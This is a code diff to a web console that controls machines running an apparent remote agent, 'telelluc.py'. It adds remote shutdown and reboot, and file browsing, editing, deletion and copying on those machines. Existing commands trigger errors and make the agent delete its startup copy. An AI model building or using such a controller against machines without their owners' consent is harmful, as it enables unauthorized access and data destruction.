@@ -424,6 +424,8 @@
         let activeDeviceHostname = null;
         let currentPath = 'C:\\';
         let controlMode = false;
+        let commandExecuting = false;
+        let fileCache = {};
 
         const strings = {
             en: {
@@ -440,9 +442,22 @@
                     'rm <deviceId>     delete a device from the list',
                     'self-delete <deviceId>  remove startup copy and local copies of the agent',
                     'control <deviceId>  open interactive control session with a device',
+                    'shutdown <deviceId>  shutdown a device (30 second countdown)',
+                    'reboot <deviceId>  reboot a device (30 second countdown)',
                     'reset-id          reset device ID counter to 1',
                     'devices           list telelluc.py machines that have checked in',
-                    'logout            end the session'
+                    'logout            end the session',
+                    '',
+                    'Control mode commands:',
+                    'cd <path>         change directory',
+                    'ls / dir          list directory contents',
+                    'pwd               show current directory',
+                    'nano <file>       edit a file',
+                    'delete / rm <file>  delete a file or directory',
+                    'copy <file>       copy file to clipboard',
+                    'paste [name]      paste file from clipboard',
+                    'clear / cls       clear the screen',
+                    'exit              exit control mode'
                 ],
                 notFound: (cmd) => `command not found: ${cmd}`,
                 tryHelp: 'type "help" to see the available commands',
@@ -466,9 +481,23 @@
                     'error <deviceId>  dispara error en una máquina (ver "devices")',
                     'rm <deviceId>     elimina un dispositivo de la lista',
                     'self-delete <deviceId>  elimina la copia de arranque y las copias locales del agente',
+                    'control <deviceId>  abre una sesión de control interactiva con un dispositivo',
+                    'shutdown <deviceId>  apaga un dispositivo (cuenta regresiva de 30 segundos)',
+                    'reboot <deviceId>  reinicia un dispositivo (cuenta regresiva de 30 segundos)',
                     'reset-id          reinicia el contador de IDs a 1',
                     'devices           lista las máquinas de telelluc.py que se registraron',
-                    'logout            cierra la sesión'
+                    'logout            cierra la sesión',
+                    '',
+                    'Comandos en modo control:',
+                    'cd <ruta>         cambia de directorio',
+                    'ls / dir          lista el contenido del directorio',
+                    'pwd               muestra el directorio actual',
+                    'nano <archivo>    edita un archivo',
+                    'delete / rm <archivo>  elimina un archivo o directorio',
+                    'copy <archivo>    copia archivo al portapapeles',
+                    'paste [nombre]    pega archivo del portapapeles',
+                    'clear / cls       limpia la pantalla',
+                    'exit              sale del modo control'
                 ],
                 notFound: (cmd) => `comando no encontrado: ${cmd}`,
                 tryHelp: 'escribí "help" para ver los comandos disponibles',
@@ -668,6 +697,48 @@
                     print(t().devicesFailed, 'error');
                 });
             },
+            shutdown(args) {
+                if (args.length === 0) {
+                    print('Usage: shutdown <deviceId>', 'dim');
+                    print('Run "devices" to see available device IDs.', 'dim');
+                    return;
+                }
+                const deviceId = args[0];
+                fetch('/api/shell', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ deviceId, payload: '__shutdown__' })
+                }).then((resp) => {
+                    if (!resp.ok) {
+                        print('Shutdown command failed.', 'error');
+                        return;
+                    }
+                    print(`Shutdown command sent to device #${deviceId}.`, 'dim');
+                }).catch(() => {
+                    print('Shutdown command failed.', 'error');
+                });
+            },
+            reboot(args) {
+                if (args.length === 0) {
+                    print('Usage: reboot <deviceId>', 'dim');
+                    print('Run "devices" to see available device IDs.', 'dim');
+                    return;
+                }
+                const deviceId = args[0];
+                fetch('/api/shell', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ deviceId, payload: '__reboot__' })
+                }).then((resp) => {
+                    if (!resp.ok) {
+                        print('Reboot command failed.', 'error');
+                        return;
+                    }
+                    print(`Reboot command sent to device #${deviceId}.`, 'dim');
+                }).catch(() => {
+                    print('Reboot command failed.', 'error');
+                });
+            },
             control(args) {
                 if (args.length === 0) {
                     print('Usage: control <deviceId>', 'dim');
@@ -717,6 +788,7 @@
                 sendRemoteCommand(activeDevice, cmd, (output) => {
                     if (output && output.trim()) {
                         print(output.trim());
+                        parseAndCacheFiles(output, currentPath);
                     } else {
                         print('Directory is empty', 'dim');
                     }
@@ -762,6 +834,26 @@
                     print(output);
                 });
             },
+            copy(args) {
+                if (args.length === 0) {
+                    print('Usage: copy <filename>', 'dim');
+                    return;
+                }
+                const filename = args.join(' ');
+                const cmd = `copy ${filename}`;
+                sendRemoteCommand(activeDevice, cmd, (output) => {
+                    print(output);
+                });
+            },
+            paste(args) {
+                let cmd = 'paste';
+                if (args.length > 0) {
+                    cmd += ` ${args.join(' ')}`;
+                }
+                sendRemoteCommand(activeDevice, cmd, (output) => {
+                    print(output);
+                });
+            },
             "reset-id"(args) {
                 fetch('/api/reset-id', {
                     method: 'POST',
@@ -790,6 +882,9 @@
         const commandNames = Object.keys(commands).sort();
 
         function sendRemoteCommand(deviceId, cmd, callback) {
+            commandExecuting = true;
+            hiddenInput.disabled = true;
+            hiddenInput.style.opacity = '0.5';
             fetch('/api/shell', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -797,17 +892,26 @@
             }).then((resp) => {
                 if (!resp.ok) {
                     print('Command failed.', 'error');
+                    commandExecuting = false;
+                    hiddenInput.disabled = false;
+                    hiddenInput.style.opacity = '1';
                     return;
                 }
                 waitForShellResult(deviceId, callback);
             }).catch(() => {
                 print('Command failed.', 'error');
+                commandExecuting = false;
+                hiddenInput.disabled = false;
+                hiddenInput.style.opacity = '1';
             });
         }
 
         async function waitForShellResult(deviceId, callback, attempts = 0) {
             if (attempts > 30) {
                 print('Timeout waiting for response.', 'error');
+                commandExecuting = false;
+                hiddenInput.disabled = false;
+                hiddenInput.style.opacity = '1';
                 return;
             }
             try {
@@ -820,6 +924,9 @@
                 const data = await resp.json();
                 if (data.result) {
                     if (callback) callback(data.result);
+                    commandExecuting = false;
+                    hiddenInput.disabled = false;
+                    hiddenInput.style.opacity = '1';
                 } else {
                     await new Promise(r => setTimeout(r, 200));
                     waitForShellResult(deviceId, callback, attempts + 1);
@@ -851,7 +958,7 @@
             if (trimmed.length === 0) return;
 
             const [cmd, ...args] = trimmed.split(/\s+/);
-            const allowedControlCommands = ['cd', 'ls', 'exit', 'clear', 'cls', 'nano', 'delete', 'rm'];
+            const allowedControlCommands = ['cd', 'ls', 'exit', 'clear', 'cls', 'nano', 'delete', 'rm', 'copy', 'paste', 'pwd', 'dir'];
 
             if (controlMode && !allowedControlCommands.includes(cmd.toLowerCase())) {
                 print(`Command not available in control mode. Available: ${allowedControlCommands.join(', ')}`, 'error');
@@ -878,8 +985,32 @@
             const v = value.toLowerCase();
             if (!v) return [];
             if (controlMode) {
-                const allowedControlCommands = ['cd', 'ls', 'exit'];
-                return allowedControlCommands.filter((name) => name.startsWith(v));
+                const allowedControlCommands = ['cd', 'ls', 'pwd', 'exit', 'clear', 'cls', 'nano', 'delete', 'rm', 'dir', 'copy', 'paste'];
+
+                const parts = value.split(/\s+/);
+                const cmd = parts[0].toLowerCase();
+                const partial = parts.length > 1 ? parts.slice(1).join(' ').toLowerCase() : '';
+
+                if (parts.length === 1) {
+                    return allowedControlCommands.filter((name) => name.startsWith(v));
+                }
+
+                const cache = fileCache[currentPath] || { files: [], folders: [] };
+
+                if (cmd === 'cd') {
+                    return cache.folders.filter(f => f.toLowerCase().startsWith(partial)).map(f => `cd ${f}`);
+                } else if (cmd === 'nano') {
+                    const allItems = [...cache.files, ...cache.folders];
+                    return allItems.filter(f => f.toLowerCase().startsWith(partial)).map(f => `nano ${f}`);
+                } else if (cmd === 'delete' || cmd === 'rm') {
+                    const allItems = [...cache.files, ...cache.folders];
+                    return allItems.filter(f => f.toLowerCase().startsWith(partial)).map(f => `${cmd} ${f}`);
+                } else if (cmd === 'copy') {
+                    const allItems = [...cache.files, ...cache.folders];
+                    return allItems.filter(f => f.toLowerCase().startsWith(partial)).map(f => `copy ${f}`);
+                }
+
+                return [];
             }
             return commandNames.filter((name) => name.startsWith(v) && name !== 'exit');
         }
@@ -954,6 +1085,37 @@
                 renderSuggestions();
             }
         });
+
+        function parseAndCacheFiles(dirOutput, path) {
+            try {
+                const lines = dirOutput.split('\n');
+                const files = [];
+                const folders = [];
+
+                lines.forEach(line => {
+                    const trimmed = line.trim();
+                    if (!trimmed || trimmed.startsWith('Directory of') || trimmed.startsWith('Volume') || trimmed === '' || trimmed.match(/^\d+\s+File/)) {
+                        return;
+                    }
+
+                    const parts = trimmed.split(/\s+/);
+                    if (parts.length >= 4) {
+                        const name = parts.slice(3).join(' ');
+                        if (trimmed.includes('<DIR>') || trimmed.includes('<JUNCTION>')) {
+                            if (name !== '.' && name !== '..') {
+                                folders.push(name);
+                            }
+                        } else if (name && !name.match(/^\d+\s+(File|Dir)/)) {
+                            files.push(name);
+                        }
+                    }
+                });
+
+                fileCache[path] = { files, folders };
+            } catch (e) {
+                // ignore parse errors
+            }
+        }
 
         function openNanoEditor(output, filename) {
             const overlay = document.getElementById('nano-editor-overlay');
